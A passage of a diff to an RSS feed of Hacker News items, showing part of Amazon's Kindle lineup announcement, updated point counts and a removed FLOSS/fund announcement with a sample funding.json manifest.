all-new, built-in AI-powered notebook enables you to quickly summarize pages and pages of notes into concise bullets in a script font that can be easily shared directly from the notebook tab. You can also refine your notes into a script font, so it becomes legible while maintaining the look and feel of handwriting.</span><br></p></span></p></div><div><p><h2>The fastest Kindle ever: The all-new Kindle Paperwhite</h2></p></div><div><p><img alt="Woman relaxing with Kindle and coffee, Kindle e-reader, colorful Kindle cases" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/1e32613/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2Fdb%2Fee%2Fe9a43a714bd3a7d572f2883eabca%2Faa-oct24-kindlepaperwhite-standard-inline-v2-400kb-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>Since its debut in 2012, customers have made Kindle Paperwhite our best-selling Kindle—and the all-new </span><a target="_blank" href="https://www.amazon.com/kindlepaperwhite"><span>Kindle Paperwhite</span></a><span> is our fastest yet. Scrolling through your Kindle Library or Store is snappy and responsive with 25% faster page turns. The display uses an oxide thin-film transistor, which gives it the highest contrast ratio of any Kindle, so text and images pop off the screen. A larger, 7-inch display is a first for Kindle Paperwhite—and yet, it is also the thinnest Kindle Paperwhite ever with up to three months of battery life.</span></p></span></p></div><div data-testid="RelatedContent"><p><a href="https://www.aboutamazon.com/news/devices/how-to-use-kindle-paperwhite"><img alt="Kindle Paperwhite." height="200" role="" src="https://assets.aboutamazon.com/dims4/default/fd25989/2147483647/strip/true/crop/1620x1080+150+0/resize/300x200!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F39%2F5d%2Ffecd31c9434a913d40a92c55dd0b%2Fpaperwhite-hero-v1.jpeg" width="300"></a></p></div><div><p><span><p><span>Kindle Paperwhite is waterproof with 16 GB of storage for thousands of books, and comes in Raspberry, Jade, and Black. </span><a target="_blank" href="https://www.amazon.com/kindlepaperwhitesignature"><span>Kindle Paperwhite Signature Edition</span></a><span>, which comes with 32 GB of storage, optional wireless charging, and auto-adjusting front light, comes in Metallic Raspberry, Metallic Jade, and Metallic Black.</span><br></p></span></p></div><div><p><h2>The new Kindle—our most compact Kindle, now in Matcha</h2></p></div><div><p><img alt="Amazon Kindle e-reader device in matcha color" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/7ccf710/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2Fbd%2Fa9%2Fd591291f4fe5bb449cba44c356f6%2Faa-oct24-kindlematcha-standard-inline-v1-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>Weighing in at just 158g, the </span><a target="_blank" href="https://www.amazon.com/kindle"><span>new entry-level Kindle</span></a><span> is small enough to fit in your hand or carry in your back pocket—and it’s packed with premium Kindle features. It has a 300 ppi, glare-free display, now with faster page turns, higher contrast ratio, and a front light that is 25% brighter at max setting—as bright as Kindle Paperwhite. It comes in a fun and fresh new Matcha color, offers weeks of battery life from a single charge, and has 16 GB of storage for holding thousands of books—all of which make it the ideal device for reading anywhere the day takes you.</span><br></p></span></p></div><div><p><h2>For the youngest readers—thousands of books and audiobooks</h2></p></div><div><p><img alt="Child reading Kindle e-reader in cozy blanket fort, Kindle with colorful covers displayed on light background" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/ef1ce4e/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F50%2Feb%2F065e42924650aa480627818ffdad%2Faa-oct24-kindlekids-standard-inline-v1-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>With Kindle Kids, parents can help their kids cultivate a love of reading at a young age—in fact, when a kid sits down with a Kindle, they read, on average, more than an hour a day. The new entry </span><a target="_blank" href="https://www.amazon.com/kindlekids"><span>Kindle Kids</span></a><span> is available with an included cover in one of the following designs: Space Whale, Ocean Explorer, and Unicorn Valley; and the new </span><a target="_blank" href="https://www.amazon.com/kindlepaperwhitekids"><span>Kindle Paperwhite Kids</span></a><span> comes with a Cyber City, Starfish, or </span><span><span>Diary of a Wimpy Kid</span></span><span> cover, designed by international bestselling author Jeff Kinney. Both devices come with a 2-year worry free guarantee and six months of </span><a target="_blank" href="https://www.amazon.com/ftu/home?ref_=ftu_kindle_friendly"><span>Amazon Kids+</span></a><span> included, a kid-friendly subscription service that provides access to thousands of age-appropriate books and audiobooks.</span></p></span></p></div><div data-testid="RelatedContent"><p><a href="https://www.aboutamazon.com/news/devices/what-is-amazon-kids-plus-subscription"><img alt="An image of two kids playing on the floor looking at an Amazon Kids tablet. " height="200" role="" src="https://assets.aboutamazon.com/dims4/default/8ddb3a1/2147483647/strip/true/crop/1688x1125+156+0/resize/300x200!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F7d%2F44%2Fed65c7284ca6bc97c318c296291e%2Famazonkids-hero-2.jpg" width="300"></a></p></div><div><p><h2>Discover your next favorite read</h2></p></div><div><p><img alt="Hands holding Kindle displaying book covers in cozy home setting" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/a3a6a84/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F1d%2F95%2F298a26504a4f85c0c3fa1322a5df%2Faa-oct24-kindlepaperwhite-standard-inline-v1-400kb-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>All Kindle devices come with access to the world’s best e-book store, and an included 3-month subscription to </span><a target="_self" href="https://www.aboutamazon.com/news/devices/what-is-kindle-unlimited"><span>Kindle Unlimited</span></a><span>, which provides an extensive library of digital books, audiobooks, comics, and magazines that span a myriad of genres, including popular series, best sellers, and more. From mystery and romance to nonfiction and memoir, members can read as many books as they’d like with a monthly membership. Learn more about how to sign up for Kindle Unlimited at </span><a target="_blank" href="https://www.amazon.com/kindle-dbs/hz/subscribe/ku"><span>amazon.com/kindleunlimited</span></a><span>.</span><br></p></span></p></div><div><p><h2>Sustainability, pricing, and availability</h2></p></div><div><p><img alt="Amazon Kindle Colorsoft device displaying image from book" height="431" role="" src="https://assets.aboutamazon.com/dims4/default/75bb014/2147483647/strip/true/crop/1600x900+0+0/resize/767x431!/quality/90/?url=https%3A%2F%2Famazon-blogs-brightspot.s3.amazonaws.com%2F15%2F80%2Fd6d497584d6a955e0cc02bedd579%2Faa-oct24-kindlecolorsoft-standard-inline-v2-400kb-1600x900.jpg" width="767"><span></span></p></div><div><p><span><p><span>Kindle is </span><a target="_blank" href="https://amzn.to/4eOox5w"><span>available now</span></a><span> starting at $109.99. Kindle Paperwhite is </span><a target="_blank" href="https://amzn.to/3UeVmAi"><span>available now</span></a><span> starting at $159.99, and Kindle Paperwhite Signature Edition is </span><a target="_blank" href="https://amzn.to/3zQQQB5"><span>available</span></a><span> for $199.99. Kindle Colorsoft Signature Edition will ship on October 30 and is available now for </span><a target="_blank" href="https://amzn.to/3UzH915"><span>pre-order</span></a><span> at $279.99. The new Kindle Scribe will ship on December 4 and is available now for </span><a target="_blank" href="https://amzn.to/48egU5F"><span>pre-order</span></a><span> starting at $399.99. Our new Kindle lineup is packaged in 100% recyclable device packaging that features a new box design that uses more recycled fiber content, averages 99% wood fiber-based materials, and uses less ink.</span></p></span></p></div></article></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Traveling with Apple Vision Pro (384 pts)]]></title>
+            <title><![CDATA[Traveling with Apple Vision Pro (389 pts)]]></title>
             <link>https://azadux.blog/2024/10/08/traveling-with-apple-vision-pro/</link>
             <guid>41859012</guid>
             <pubDate>Wed, 16 Oct 2024 13:48:51 GMT</pubDate>
@@ -2765,7 +3384,7 @@ docker pull archivebox/archivebox:dev
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Douglas Hofstadter on Lisp (1983) (330 pts)]]></title>
+            <title><![CDATA[Douglas Hofstadter on Lisp (1983) (334 pts)]]></title>
             <link>https://gist.github.com/jackrusher/5139396</link>
             <guid>41858975</guid>
             <pubDate>Wed, 16 Oct 2024 13:44:37 GMT</pubDate>
@@ -3354,7 +3973,7 @@ this could come in mighty handy.</p>
   </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Amazon buys stake in nuclear energy developer in push to power data centres (129 pts)]]></title>
+            <title><![CDATA[Amazon buys stake in nuclear energy developer in push to power data centres (130 pts)]]></title>
             <link>https://www.ft.com/content/00776191-b010-4104-add4-8dc430386911</link>
             <guid>41858863</guid>
             <pubDate>Wed, 16 Oct 2024 13:32:36 GMT</pubDate>
@@ -3364,7 +3983,7 @@ Make up your own mind. Build robust opinions with the FT’s trusted journalism.
 Take this offer before 24 October.</span></p></div></div><div id="recommendedOffers-Recommended offers-6615b5d2-334c-4624-9cac-70c882e3db14" data-component="recommendedOffers" data-component-unique-name="Recommended offers"><p><h2 data-o-grid-colspan="12">Explore more offers.</h2></p><div data-o-grid-colspan="12"><div data-o-grid-colspan="12"><div><p><img src="https://www.ft.com/__origami/service/image/v2/images/raw/https://barrier-page-components.s3.eu-west-1.amazonaws.com/assets/icons/primary_product_icon_trial.svg?source=next-barrier-page&amp;format=svg" alt=""></p></div><p><span>CHF1</span><span> for 4 weeks</span></p><p><span>Then </span><span>CHF85</span><span> per month. Complete digital access to quality FT journalism. Cancel anytime during your trial.</span></p></div><div data-o-grid-colspan="12"><div><p><img src="https://www.ft.com/__origami/service/image/v2/images/raw/https://barrier-page-components.s3.eu-west-1.amazonaws.com/assets/icons/primary_product_icon_weekend_premium.svg?source=next-barrier-page&amp;format=svg" alt=""></p></div><p><span>CHF85</span><span> per month</span></p><p><span>Get Premium &amp; FT Weekend Print edition for the price of Premium. Complete digital access to quality analysis and expert insights, complemented with our award-winning Weekend Print edition.</span></p></div><div data-o-grid-colspan="12"><div><p><img src="https://www.ft.com/__origami/service/image/v2/images/raw/https://barrier-page-components.s3.eu-west-1.amazonaws.com/assets/icons/primary_product_icon_print.svg?source=next-barrier-page&amp;format=svg" alt=""></p></div><p><span>CHF345</span><span> for your first year</span></p><p><span>FT newspaper delivered Monday-Saturday, plus FT Digital Edition delivered to your device Monday-Saturday.</span></p></div></div></div><div data-component="subscriptionOptions" data-component-unique-name="Subscription options"><h2>Explore our full range of subscriptions.</h2><div><div><p>Discover all the plans currently available in your country</p></div><div><p>Digital access for organisations. Includes exclusive features and content.</p></div></div></div><div data-component="whyFT" data-component-unique-name="Why FT"><div><h2>Why the FT?</h2><p>See why over a million readers pay to read the Financial Times.</p></div><p><a href="https://subs.ft.com/whytheft?ft-content-uuid=00776191-b010-4104-add4-8dc430386911">Find out why</a></p></div></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[FTC Announces "Click-to-Cancel" Rule Making It Easier to Cancel Subscriptions (1429 pts)]]></title>
+            <title><![CDATA[FTC Announces "Click-to-Cancel" Rule Making It Easier to Cancel Subscriptions (1448 pts)]]></title>
             <link>https://www.ftc.gov/news-events/news/press-releases/2024/10/federal-trade-commission-announces-final-click-cancel-rule-making-it-easier-consumers-end-recurring</link>
             <guid>41858665</guid>
             <pubDate>Wed, 16 Oct 2024 13:09:04 GMT</pubDate>
@@ -3393,216 +4012,6 @@ Take this offer before 24 October.</span></p></div></div><div id="recommendedOff
 
           
                   </div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Floss/fund: $1M per year for free and open source projects (388 pts)]]></title>
-            <link>https://floss.fund/blog/announcing-floss-fund/</link>
-            <guid>41857032</guid>
-            <pubDate>Wed, 16 Oct 2024 09:02:25 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://floss.fund/blog/announcing-floss-fund/">https://floss.fund/blog/announcing-floss-fund/</a>, See on <a href="https://news.ycombinator.com/item?id=41857032">Hacker News</a></p>
-<div id="readability-page-1" class="page"><section>
-    
-    <article>
-      <div>
-        <div>
-              <p><img src="https://avatars1.githubusercontent.com/u/547147?s=64&amp;v=4" alt="Kailash Nadh photo">
-              </p>
-              <div>
-                <p><span>Kailash Nadh</span>
-                <span>CTO @ Zerodha</span></p><p><a href="https://nadh.in/"><img src="https://floss.fund/static/ico-www.svg" alt="Homepage link"></a>
-                  
-                  
-                    <a href="https://github.com/knadh"><img src="https://floss.fund/static/ico-github.svg" alt="GitHub link"></a>
-                  
-                </p>
-              </div>
-            </div><!-- meta -->
-
-        <div>
-          
-          <p>15 Oct 2024</p>
-
-          <p>TLDR; <a href="https://dir.floss.fund/submit">Apply now</a></p>
-<hr>
-<p>We are excited to announce the launch of a dedicated fund aimed at providing financial assistance to Free/Libre and Open Source Software (FOSS/FLOSS) projects globally, with an annual commitment of $1 million. I will use the FOSS acronym in this post hereafter.</p>
-<p>This has been in the works for some time at Zerodha<sup><a href="https://zerodha.com/">[↗]</a></sup>, where we have been developing financial technology products and services built on an ever-growing FOSS stack. Without the high-quality FOSS projects that we have freely downloaded and used to build our organisation, products, and services, we would not exist as we do today—free as in both cost and freedom. A significant portion of our success and growth is owed to FOSS, encompassing everything from programming languages to operating systems, to databases, web servers, frontend frameworks, productivity tools, code editors, and absolutely everything. It goes without saying that this holds true for nearly every technology company founded in the last decade, whether it is publicly acknowledged or not.</p>
-<p>And yet, funding and financial sustainability, the lack thereof really, has been an increasingly hot topic over the last many years. Well, at least since <em>cloud</em> companies began making massive profits directly repackaging FOSS projects built by hobbyists and communities. The rise of the "open core" model and the unfortunate license changes in many good open projects recently, are clear signs of this growing turmoil. Many potential solutions seem to be emerging and evoling—commercial services, Venture Capital (VC) funding, and programs like GitHub Sponsors<sup><a href="https://github.com/sponsors">[↗]</a></sup>, Open Collective<sup><a href="https://opencollective.com/">[↗]</a></sup>, FUTO<sup><a href="https://futo.org/">[↗]</a></sup>, Polar<sup><a href="https://polar.sh/">[↗]</a></sup>, and <em>Buy me a coffee</em><sup><a href="https://buymeacoffee.com/">[↗]</a></sup>, amongst others. That said, Python libraries raising massive amounts of VC funding in quick time does not look like a healthy trend.</p>
-<p>Why are we here, though? The fundamental tenets of FOSS, the spirit of hacking, liberty, and reciprocity, while they have worked beautifully with code, have translated poorly into the highly commercial <em>BigTech</em> era. So far, it has been nearly impossible to quantify and structure ideas of goodwill and reciprocity into financial sustenance for FOSS projects. I recall the log4j incident from a couple of years ago which unleashed a spate of philosophical debates around  FOSS, in which I also participated<sup><a href="https://nadh.in/blog/open-source-is-not-broken/">[↗]</a></sup>, rather ideologically.</p>
-<p>For us, FLOSS/fund is about hacker goodwill, reciprocity, and common sense business strategy. We invite you to <a href="https://dir.floss.fund/submit">apply for funding</a>. If you would like to understand the motivations behind this, a bit of storytelling lies ahead.</p>
-<h2 id="prelude">Prelude</h2>
-<p>The very first thing I did when we started Zerodha Tech more than a decade ago was to install Python and start scripting and automating time-consuming, mundane organisational tasks. Then came Postgres for building a small data warehouse, followed by PHP and WordPress for managing our website. From there, as we slowly grew the organisation, our technology stack expanded one piece of FOSS at a time, eventually leading to us becoming the largest stock broker in India several years later. Personally, my mental markup as a software developer and hacker is rooted in the simple act of copy-pasting open source code from the internet to hack, tinker, learn, and solve problems. An alternate vision is very difficult for me to comprehend, and a non-FOSS path to building technology, let alone an organisation, has never seemed logical.</p>
-<p>At Zerodha, over the years, we have contributed upstream to many projects that we use, as well as spun off and released several small and large FOSS projects<sup><a href="https://zerodha.tech/">[↗]</a></sup> from our work. In 2019, we made a sizeable investment in ERPNext<sup><a href="https://erpnext.com/">[↗]</a></sup>, a FOSS ERP that we had begun using extensively. In 2020, we co-founded the FOSS United Foundation<sup><a href="https://fossunited.org/">[↗]</a></sup>, which works on developing the FOSS ecosystem in India, and backed the creation of TinkerSpace<sup><a href="https://www.tinkerhub.org/tinkerspace">[↗]</a></sup>, a physical hackerspace and community center that hosts FOSS tinkering for young people. In 2023, we were a founding member of OASIS (Open-Source Alliance for Social Innovation and Sustainability)<sup><a href="https://oasishq.org/">[↗]</a></sup>, which focuses on FOSS capacity building and adoption in social sector non-profit organisations. Many of us from our team also volunteer at non-profits, helping drive meaningful FOSS adoption in the development sector, where even basic technological requirements are woefully unmet. We fund many of these initiatives with long-term commitments.</p>
-<p>In addition, we have given out many sizeable grants to FOSS projects and organisations in India. While funding projects outside India involves significant paperwork and operational overhead, we have reached out to several small and large projects that we use at work and have managed to pay them. This highly ad hoc approach is something that has increasingly bugged me though.</p>
-<p>While it is good to provide financial support to FOSS-aligned activities, most importantly, money ought to go directly to the source—invaluable FOSS projects. We have managed to build a commercially successful business on top of FOSS that we have freely, in both cost and freedom, adopted from all over the world. Therefore, "ad hoc" and "reaching out" simply do not suffice—we have to shut up or put up.</p>
-<h2 id="thus-structure">Thus, structure.</h2>
-<p>And that is how the idea of a structured, dedicated fund for FOSS projects globally, was born. We spent several months speaking to various banks, payment processors, and lawyers to finally arrive at a reasonably streamlined process. The fund will:</p>
-<ul>
-<li>Have a small, dedicated team to operate it properly in a non-adhoc manner, functioning like an OSPO (Open Source Program Office) but focused on funding projects—an OSFO (Open Source Funding Office), perhaps?</li>
-<li>Put money where the mouth is—a minimum of $10,000 and up to $100,000 for a single recipient, totaling $1 million per year, which we will increase once we understand the dynamics of running the fund.</li>
-<li>Source applications globally, relying on incoming applications through for discovering projects in need of support rather than the limited visibility we have as a small team.</li>
-<li>Form an interim internal selection committee to make discretionary selections. Once potential edge cases and any gotchas in running the program are handled, we will attempt to establish a public selection committee from the FOSS ecosystem with a community voting process for applications.</li>
-</ul>
-<h2 id="more-structure-funding-json">More structure: funding.json</h2>
-<p>Expanding a bit on "ad hoc" and "reaching out" I mentioned earlier, the  majority of our experience paying projects has transpired like this:</p>
-<p>On a random day, we realise that a certain FOSS project has become very useful to us. After a bit of online searching, we find the developer's email address. We write to the developer, thanking them for their work, explaining how useful we find it, and expressing our interest in financially supporting it. They respond, thanking us but stating that they have not thought of any specific numbers. After a bit of friendly back and forth, we suggest an arbitrary amount, followed by more discussion about logistics and paperwork. This process of arriving at numbers over personal e-mails is awkward for both parties. It addition, it typically takes weeks, requiring time, commitment, and bandwidth from both the developer and the donor to complete a single transaction. Models like Open Collective and GitHub Sponsors address this to some extent, but there is no open, decentralized mechanism for discovering projects in need of financial assistance nor gaining insights into their specific needs.</p>
-<p>Any attempt on funding FOSS projects generally warrants clarity on several questions.</p>
-<ul>
-<li>Does the project under consideration need financial assistance?</li>
-<li>Or perhaps it is not just one particular project, but a developer or a group of developers who maintain several projects that need assistance.</li>
-<li>What kind and quantum of financial assistance are needed, and for what activities? Is there a structured support plan that the developers offer?</li>
-<li>Has the project received any funding in the past? Is it in dire need of support, or is it doing reasonably well?</li>
-<li>What payment methods are accepted? Is there a payment link or address that can be used without manual contact, or is something like a bank wire that is required?</li>
-<li>Once there is enough context, and a conversation is warranted, how does one reach out to the right person who address financial or logistical queries?</li>
-<li>That's about one project. But what about a particular category of projects? Maybe it is an emerging or critical area, and it would make sense to support multiple projects there. How does one discover them?</li>
-</ul>
-<p>What if the answers to such questions could be structured in a machine readable format, which could be crawled, indexed, catalogued, and made discoverable—similar to a <code>robots.txt</code> or <code>package.json</code> or <code>sitemap.xml</code>, but for funding. In the process, eliminating a lot of awkwardness and apprehension that would be otherwise transpire over back-and-forth personal e-mails discussing financial matters.</p>
-<p>How about a standardised <code>funding.json</code> manifest file that can be added to project repositories and websites signalling their financial needs? Something like this:</p>
-<pre data-lang="python"><code data-lang="python"><span>{
-</span><span>    </span><span>"version"</span><span>: </span><span>"v1.0.0"</span><span>,
-</span><span>    </span><span>"entity"</span><span>: {
-</span><span>        </span><span>"type"</span><span>: </span><span>"individual"</span><span>,
-</span><span>        </span><span>"role"</span><span>: </span><span>"maintainer"</span><span>,
-</span><span>        </span><span>"name"</span><span>: </span><span>"The One (demo)"</span><span>,
-</span><span>        </span><span>"email"</span><span>: </span><span>"<a href="https://floss.fund/cdn-cgi/l/email-protection" data-cfemail="e48a818ba4819c8589948881ca878b89">[email&nbsp;protected]</a>"</span><span>,
-</span><span>        </span><span>"phone"</span><span>: </span><span>""</span><span>,
-</span><span>        </span><span>"description"</span><span>: </span><span>"I'm a developer interested in preserving digital freedoms and the decentralised and open nature of the internet. I like breaking down barriers in the cyberspace with FOSS technologies.</span><span>\n\n</span><span>Sometimes I can't shake the feeling that the system we're living in isn't quite what it seems. That there is no spoon.</span><span>\n\n</span><span>PS: This is a dummy listing."</span><span>,
-</span><span>        </span><span>"webpageUrl"</span><span>: {
-</span><span>            </span><span>"url"</span><span>: </span><span>"https://example.com"</span><span>,
-</span><span>            </span><span>"wellKnown"</span><span>: </span><span>""
-</span><span>        }
-</span><span>    },
-</span><span>    </span><span>"projects"</span><span>: [{
-</span><span>        </span><span>"guid"</span><span>: </span><span>"zombo-app"</span><span>,
-</span><span>        </span><span>"name"</span><span>: </span><span>"Zombo App (demo)"</span><span>,
-</span><span>        </span><span>"description"</span><span>: </span><span>"The Zombo App is a database application that solves many problems and makes anything possible. Anything at all. Its possibilities are only limited by the user's own imagination.</span><span>\n\n</span><span>It has been in active development for a decade and is used by millions of people worldwide. It is the next frontier.</span><span>\n\n</span><span>PS: This is a dummy demo listing."</span><span>,
-</span><span>        </span><span>"webpageUrl"</span><span>: {
-</span><span>            </span><span>"url"</span><span>: </span><span>"https://example.com/projects/zombo"
-</span><span>        },
-</span><span>        </span><span>"repositoryUrl"</span><span>: {
-</span><span>            </span><span>"url"</span><span>: </span><span>"https://github.com/example/zombo-app"</span><span>,
-</span><span>            </span><span>"wellKnown"</span><span>: </span><span>"https://github.com/example/zombo-app/blob/main/.well-known/funding-manifest-urls"
-</span><span>        },
-</span><span>        </span><span>"licenses"</span><span>: [</span><span>"spdx:AGPL-3.0"</span><span>],
-</span><span>        </span><span>"tags"</span><span>: [</span><span>"database"</span><span>, </span><span>"columnar-database"</span><span>, </span><span>"high-performance"</span><span>, </span><span>"key-value-store"</span><span>]
-</span><span>    },
-</span><span>    {
-</span><span>        </span><span>"guid"</span><span>: </span><span>"vb-gooey"</span><span>,
-</span><span>        </span><span>"name"</span><span>: </span><span>"VB Gooey IP tracer (demo)"</span><span>,
-</span><span>        </span><span>"description"</span><span>: </span><span>"Using quantum-entangled packet sniffers, this cutting-edge Visual Basic GUI IP Tracer employs hyper-threaded blockchain algorithms to decrypt the target's digital DNA signature. The system's neural network of overclocked RAM crystals generates a real-time holographic map of cyberspace, pinpointing the perp's location with nanosecond precision.</span><span>\n\n</span><span>In addition, its turbo-encabulated flux capacitor and multi-dimensional firewall penetrator, allows any hyper-dimensional air-gapped network to be broken into with ease.</span><span>\n\n\n\n</span><span>PS: This is a dummy demo listing."</span><span>,
-</span><span>        </span><span>"webpageUrl"</span><span>: {
-</span><span>            </span><span>"url"</span><span>: </span><span>"https://vb-gooey-ip-tracer.net"</span><span>,
-</span><span>            </span><span>"wellKnown"</span><span>: </span><span>"https://vb-gooey-ip-tracer.net/.well-known/funding-manifest-urls"
-</span><span>        },
-</span><span>        </span><span>"repositoryUrl"</span><span>: {
-</span><span>            </span><span>"url"</span><span>: </span><span>"https://github.com/example/vb-gooey-ip-tracer"</span><span>,
-</span><span>            </span><span>"wellKnown"</span><span>: </span><span>"https://github.com/example/vb-gooey-ip-tracer/blob/main/.well-known/funding-manifest-urls"
-</span><span>        },
-</span><span>        </span><span>"licenses"</span><span>: [</span><span>"spdx:MIT"</span><span>],
-</span><span>        </span><span>"tags"</span><span>: [</span><span>"high-performance"</span><span>, </span><span>"security"</span><span>, </span><span>"gui"</span><span>, </span><span>"networking"</span><span>]
-</span><span>    }],
-</span><span>    </span><span>"funding"</span><span>: {
-</span><span>        </span><span>"channels"</span><span>: [
-</span><span>            {
-</span><span>                </span><span>"guid"</span><span>: </span><span>"mybank"</span><span>,
-</span><span>                </span><span>"type"</span><span>: </span><span>"bank"</span><span>,
-</span><span>                </span><span>"address"</span><span>: </span><span>""</span><span>,
-</span><span>                </span><span>"description"</span><span>: </span><span>"Will accept direct bank transfers. Please e-mail me for details."
-</span><span>            },
-</span><span>            {
-</span><span>                </span><span>"guid"</span><span>: </span><span>"mypay"</span><span>,
-</span><span>                </span><span>"type"</span><span>: </span><span>"payment-provider"</span><span>,
-</span><span>                </span><span>"address"</span><span>: </span><span>"https://example.com/payme/@myid"</span><span>,
-</span><span>                </span><span>"description"</span><span>: </span><span>"Pay with your debit/credit card through this gateway and setup recurring subscriptions."
-</span><span>            }
-</span><span>        ],
-</span><span>        </span><span>"plans"</span><span>: [
-</span><span>            {
-</span><span>                </span><span>"guid"</span><span>: </span><span>"hosting-monthly"</span><span>,
-</span><span>                </span><span>"status"</span><span>: </span><span>"active"</span><span>,
-</span><span>                </span><span>"name"</span><span>: </span><span>"Hosting support"</span><span>,
-</span><span>                </span><span>"description"</span><span>: </span><span>"This will cover the monthly server hosting costs for the projects."</span><span>,
-</span><span>                </span><span>"amount"</span><span>: </span><span>250</span><span>,
-</span><span>                </span><span>"currency"</span><span>: </span><span>"USD"</span><span>,
-</span><span>                </span><span>"frequency"</span><span>: </span><span>"monthly"</span><span>,
-</span><span>                </span><span>"channels"</span><span>: [</span><span>"mypay"</span><span>]
-</span><span>            },
-</span><span>            {
-</span><span>                </span><span>"guid"</span><span>: </span><span>"developer-time"</span><span>,
-</span><span>                </span><span>"status"</span><span>: </span><span>"active"</span><span>,
-</span><span>                </span><span>"name"</span><span>: </span><span>"Developer compensation"</span><span>,
-</span><span>                </span><span>"description"</span><span>: </span><span>"This will cover the cost of one developer working part-time on the projects."</span><span>,
-</span><span>                </span><span>"amount"</span><span>: </span><span>1000</span><span>,
-</span><span>                </span><span>"currency"</span><span>: </span><span>"USD"</span><span>,
-</span><span>                </span><span>"frequency"</span><span>: </span><span>"monthly"</span><span>,
-</span><span>                </span><span>"channels"</span><span>: [</span><span>"mybank"</span><span>]
-</span><span>            },
-</span><span>            {
-</span><span>                </span><span>"guid"</span><span>: </span><span>"angel-plan"</span><span>,
-</span><span>                </span><span>"status"</span><span>: </span><span>"active"</span><span>,
-</span><span>                </span><span>"name"</span><span>: </span><span>"Goodwill plan"</span><span>,
-</span><span>                </span><span>"description"</span><span>: </span><span>"Pay anything you wish to show your goodwill for the project."</span><span>,
-</span><span>                </span><span>"amount"</span><span>: </span><span>0</span><span>,
-</span><span>                </span><span>"currency"</span><span>: </span><span>"USD"</span><span>,
-</span><span>                </span><span>"frequency"</span><span>: </span><span>"one-time"</span><span>,
-</span><span>                </span><span>"channels"</span><span>: [</span><span>"mybank"</span><span>, </span><span>"mypay"</span><span>]
-</span><span>            }
-</span><span>        ],
-</span><span>        </span><span>"history"</span><span>: [
-</span><span>            {</span><span>"year"</span><span>: </span><span>2020</span><span>, </span><span>"income"</span><span>: </span><span>10000</span><span>, </span><span>"expenses"</span><span>: </span><span>2000</span><span>, </span><span>"taxes"</span><span>: </span><span>200</span><span>, </span><span>"currency"</span><span>: </span><span>"USD"</span><span>, </span><span>"description"</span><span>: </span><span>"Started accepting donations for the first time."</span><span>},
-</span><span>            {</span><span>"year"</span><span>: </span><span>2021</span><span>, </span><span>"income"</span><span>: </span><span>15000</span><span>, </span><span>"expenses"</span><span>: </span><span>5000</span><span>, </span><span>"taxes"</span><span>: </span><span>500</span><span>, </span><span>"currency"</span><span>: </span><span>"USD"</span><span>, </span><span>"description"</span><span>: </span><span>""</span><span>},
-</span><span>            {</span><span>"year"</span><span>: </span><span>2022</span><span>, </span><span>"income"</span><span>: </span><span>30000</span><span>, </span><span>"expenses"</span><span>: </span><span>10000</span><span>, </span><span>"taxes"</span><span>: </span><span>2000</span><span>, </span><span>"currency"</span><span>: </span><span>"USD"</span><span>, </span><span>"description"</span><span>: </span><span>""</span><span>},
-</span><span>            {</span><span>"year"</span><span>: </span><span>2023</span><span>, </span><span>"income"</span><span>: </span><span>25000</span><span>, </span><span>"expenses"</span><span>: </span><span>15000</span><span>, </span><span>"taxes"</span><span>: </span><span>1500</span><span>, </span><span>"currency"</span><span>: </span><span>"USD"</span><span>, </span><span>"description"</span><span>: </span><span>"There was a dip, but we see this improving."</span><span>}
-</span><span>        ]
-</span><span>    }
-</span><span>}
-</span><span>
-</span></code></pre>
-<p>To initiate and give this experiment a serious shot, FLOSS/fund will accept funding requests from projects through a publicly accessible <code>funding.json</code> file hosted on their respositories or websites. This file is not meant to convey everything there is to know—an impossible task—but to solicit interest and communicate enough to ensure discoverability which would not be possible otherwise. Refer to the <a href="https://floss.fund/funding-manifest">funding.json docs</a> to know more.</p>
-<p>Applications that come through to the FLOSS/fund will be indexed and published on the <a href="https://dir.floss.fund/">dir.floss.fund</a> directory / portal, making them publicly discoverable by anyone interested in supporting projects. This is going to be an interesting experiment. Fingers crossed!</p>
-<h2 id="motivations">Motivations</h2>
-<p>What are the motivations behind the fund? On a personal level, it is common sense, goodwill, and reciprocity—the spirit of FOSS. From a for-profit enterprise perspective, however, terms like "goodwill" and "reciprocity" are notoriously problematic, and most likely fundamentally incompatible with their very nature. But, that is a separate philosophical debate altogether.</p>
-<p>Setting philosophies aside, it makes perfect logical sense for a business that relies on FOSS to support it, directly or indirectly, when they freely tap into a global ecosystem of unlimited FOSS innovation—free in both cost and freedom. How many technology companies today could even exist without the massive amounts of FOSS they use? Ensuring that this ecosystem thrives, without inadvertently turning parts of it into a classic tragedy of the commons, everything aside, is good, logical business strategy. At the very least, a profitable business should allocate a tiny fraction of its profits to support the projects it is directly reliant on. When many startups have advertising and marketing budgets that often put public spending to shame, one would be hard-pressed to find a reason not to give a bit of money  to the projects they depend on for their very existence.</p>
-<p>Thus, FLOSS/fund's motivations are to:</p>
-<ul>
-<li>Exercise our goodwill and reciprocity on a personal level as FOSS hackers.</li>
